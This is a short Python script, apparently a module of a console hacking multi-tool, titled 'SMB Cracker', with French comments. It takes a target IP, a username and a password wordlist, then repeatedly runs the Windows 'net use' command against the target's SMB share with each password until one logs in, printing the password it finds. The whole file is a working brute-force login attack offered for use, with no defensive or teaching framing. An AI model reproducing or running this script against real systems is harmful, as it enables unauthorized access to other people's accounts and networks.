from Config.Util import *
from Config.Config import *
import subprocess
import os
import re

def smb_bruteforce(ip, username, wordlist):
    if not os.path.exists(wordlist):
        print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Wordlist not found: {wordlist}")
        return False
        
    # Vérifier le format de l'IP
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid IP format: {ip}")
        return False
    
    with open(wordlist, 'r') as file:
        passwords = file.readlines()

    for count, password in enumerate(passwords, start=1):
        password = password.strip()
        print(f"\n{BEFORE + current_time_hour() + AFTER}{primary}[{secondary}{tr('ATTEMPT')} {count}{primary}] [{password}]")
        
        try:
            # Utiliser le double backslash pour les chemins Windows
            share_path = f'\\\\{ip}'
            command = ['net', 'use', share_path, f'/user:{username}', password]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            
            if result.returncode == 0:
                print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} {primary}{tr('PasswdFound')} {secondary}{password}")
                # Déconnecter le partage après succès
                subprocess.run(['net', 'use', share_path, '/d', '/y'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            elif "System error 1326" in result.stderr:  # Mauvais mot de passe
                continue
            elif "System error 53" in result.stderr:  # Hôte non trouvé
                print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Host not found: {ip}")
                return False
        except Exception as e:
            print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Error: {str(e)}")
            return False
    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} No valid password found in wordlist")
    return False

if __name__ == "__main__":
    Title("SMB Cracker")
    
    ip = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT}{primary} {tr('EnterIPAdress')} -> {reset}")
    username = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT}{primary} {tr('EnterUsername')} -> {reset}")
    wordlist = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT}{primary} {tr('EnterPassList')} -> {reset}")
    
    if not smb_bruteforce(ip, username, wordlist):
        Continue()
        Reset()

